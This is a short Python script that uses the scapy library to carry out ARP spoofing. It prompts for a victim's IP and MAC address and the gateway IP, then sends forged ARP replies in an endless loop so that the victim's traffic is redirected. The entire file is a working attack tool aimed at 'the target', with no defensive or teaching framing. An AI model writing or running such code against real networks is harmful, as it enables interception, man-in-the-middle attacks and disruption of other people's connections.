
from scapy.all import *
from subprocess import call
import time

op = 1  # Op code 1 for ARP requests
victim = input('Enter the target IP >>> ')  # person IP to attack
victim = victim.replace(" ", "")

spoof = input('Enter Gateway IP >>> ')  # routers IP.. Should be the same one.
spoof=spoof.replace(" ", "")

mac = input('Enter the target MAC >>> ')  # mac of the victim
mac = mac.replace("-", ":")
mac = mac.replace(" ", "")

arp = ARP(op=op, psrc=spoof, pdst=victim, hwdst=mac)

while 1:
    send(arp)
    time.sleep(2)
